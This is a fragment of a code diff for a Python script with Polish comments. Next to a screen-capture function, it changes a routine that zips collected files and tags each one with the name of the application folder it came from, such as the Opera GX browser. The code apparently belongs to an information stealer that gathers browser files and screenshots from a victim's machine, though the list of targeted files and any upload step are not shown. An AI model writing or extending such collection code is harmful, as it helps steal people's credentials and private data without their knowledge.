@@ -46,12 +46,20 @@ def take_screenshot(save_path):
         print(f"Błąd przy robieniu zrzutu ekranu: {e}")
         return None
 
-# Funkcja do tworzenia pliku ZIP
+# Funkcja do tworzenia pliku ZIP z unikalnymi nazwami plików
 def create_zip_from_files(file_paths, zip_file_name):
     with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for file in file_paths:
             if os.path.exists(file):
-                zipf.write(file, os.path.basename(file))
+                # Pobieramy nazwę aplikacji z pełnej ścieżki
+                app_name = file.split("\\")[-3]  # Używamy nazwy aplikacji (np. "Opera GX")
+                file_name = os.path.basename(file)
+                
+                # Tworzymy unikalną nazwę pliku, dodając nazwę aplikacji
+                unique_file_name = f"{file_name} {app_name}"
+                
+                # Dodajemy plik do ZIP z nową nazwą
+                zipf.write(file, unique_file_name)
                 print(f"Dodano plik do ZIP-a: {file}")
             else:
                 print(f"Plik nie istnieje i nie został dodany do ZIP-a: {file}")
